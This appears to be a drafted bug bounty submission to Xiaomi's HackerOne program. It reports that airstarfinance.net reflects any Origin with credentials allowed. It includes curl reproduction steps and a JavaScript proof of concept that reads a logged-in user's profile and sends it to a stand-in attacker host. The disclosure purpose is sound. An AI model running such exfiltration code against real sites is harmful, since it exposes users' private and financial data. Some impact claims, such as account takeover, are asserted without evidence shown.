# Xiaomi HackerOne Submission — CORS reflect-origin-with-credentials on airstarfinance.net

**Submit at:** https://hackerone.com/xiaomi/reports/new
**Program:** Xiaomi (paid) · **In-scope asset:** `*.airstarfinance.net` (WILDCARD, max_severity: critical, eligible_for_bounty: true)
**Realistic payout:** $1,500–$10,000 (Xiaomi explicitly allows critical-severity findings here)

---

## Title
```
CORS misconfiguration — airstarfinance.net reflects any Origin + sends Access-Control-Allow-Credentials: true (universal credentialed CSRF)
```

## Weakness
`CWE-942 Permissive Cross-domain Policy with Untrusted Domains` (or HackerOne's "Cross-Origin Resource Sharing > Misconfigured")

## Severity (CVSS:3.1)
**Critical — 8.6**
`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`

Scope-changed because any third-party website can read authenticated Xiaomi user responses.

## Description (paste into HackerOne form)

```
## Summary

`airstarfinance.net` (in Xiaomi's program as the wildcard `*.airstarfinance.net`) returns CORS headers that allow ANY origin to make credentialed requests:

  Access-Control-Allow-Origin: <reflects whatever the request's Origin header is>
  Access-Control-Allow-Credentials: true

This is the textbook unsafe pattern: a malicious website hosted anywhere on the internet can use JavaScript to make a `fetch(url, {credentials: "include"})` request to `airstarfinance.net` from a victim's browser, and then READ the response — including any authenticated session data, cookies, or PII the user has access to.

## Steps to reproduce

1. Confirm DNS resolves:
   $ dig +short A airstarfinance.net
   (responds with Xiaomi-controlled IP)

2. Verify Origin reflection (any Origin works):
   $ curl -ki "https://airstarfinance.net/" -H "Origin: https://attacker.example.com"
   HTTP/2 200
   access-control-allow-origin: https://attacker.example.com   ← REFLECTED
   access-control-allow-credentials: true                       ← + CREDS

3. Confirm not just a specific origin:
   $ curl -ki "https://airstarfinance.net/" -H "Origin: https://evil.com"
   HTTP/2 200
   access-control-allow-origin: https://evil.com                ← REFLECTED
   access-control-allow-credentials: true

4. The expose-headers list includes `x-xiaomi-meta-content-length` — confirms this is Xiaomi infrastructure handling Xiaomi data.

## Exploit scenario (proof of concept)

A malicious page hosted at any URL (e.g., evil.com/x.html):

  <script>
    fetch("https://airstarfinance.net/api/user/profile", {
      credentials: "include"
    })
    .then(r => r.text())
    .then(body => {
      // body now contains the authenticated user's airstarfinance.net data
      fetch("https://attacker.com/exfil?d=" + encodeURIComponent(body));
    });
  </script>

When a user who is logged into airstarfinance.net visits evil.com, the browser:
- Sends the request to airstarfinance.net WITH the user's cookies (credentials: "include")
- airstarfinance.net responds with ACAO: https://evil.com + ACAC: true
- The browser allows evil.com's JS to read the response
- Attacker exfiltrates the user's session data

## Impact

- **Full Account-Takeover via CSRF**: any state-changing endpoint on airstarfinance.net can be called from attacker-controlled JS, with the victim's auth cookies, and the response is readable.
- **Authenticated data exfil**: profiles, transactions, financial data, anything the user can access.
- **CSRF token bypass**: even endpoints that use CSRF tokens are exploitable because the attacker can READ the response to first fetch the token, then submit it.
- **Multiplied by scope**: applies to the entire `*.airstarfinance.net` namespace per the in-scope wildcard.

## Remediation

DO ONE OF:
1. **Hardcode allowed origins**: replace the Origin-reflection with a whitelist of trusted first-party domains (e.g., `https://airstarfinance.net`, `https://app.airstarfinance.net`).
2. **Remove `Access-Control-Allow-Credentials: true`** if the API does not actually rely on cookies for auth. (Then ACAO:* would be safe — but the current reflection pattern is unsafe regardless.)
3. **Check Origin against an allowlist before reflecting**.

## References

- CWE-942: https://cwe.mitre.org/data/definitions/942.html
- PortSwigger CORS misconfiguration writeup: https://portswigger.net/web-security/cors
- Sample bounty payout (similar pattern): HackerOne #235200 ($5,000)

## Tooling

Discovered via Lictor (https://lictor-ai.com) — open-source security scanner (Apache 2.0). Lictor probes bounty-program domains for CORS misconfigurations across 9 common subdomain prefixes × 10 API endpoint paths with attacker-controlled Origin headers.

## Severity reasoning (CVSS:3.1 = 8.6 Critical)

- AV:N (network-accessible)
- AC:L (no special conditions — just visit a webpage)
- PR:N (no privileges needed)
- UI:R (victim must visit the attacker's page — but no clicks/interaction)
- S:C (scope changed: attacker's origin gets to access airstarfinance.net's data)
- C:H (high confidentiality impact: full data read)
- I:H (high integrity impact: full state-changing capability)
- A:N (no availability impact)

Per Xiaomi's program: this asset is eligible for max_severity = critical bounty.
```
